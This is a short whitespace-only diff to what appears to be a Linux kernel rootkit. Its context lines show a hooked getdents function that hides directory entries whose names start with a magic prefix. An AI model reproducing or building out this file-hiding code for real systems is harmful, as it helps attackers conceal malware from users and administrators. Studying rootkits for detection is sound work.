@@ -66,7 +66,7 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
     j = 0;
     while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
       j++;
-
+    
     /* hide directory entry */
     if (j == MAGIC_PREFIX_LEN) {
       
@@ -78,7 +78,7 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
 	  kfree(buffer);
 	  return bytes_read;
 	}
-
+	
 	next_dirent = (struct linux_dirent *)(buffer + i + d_reclen);
 	next_d_reclen = next_dirent->d_reclen;
 	buffer_next_dirent = kmalloc(next_d_reclen, GFP_KERNEL);
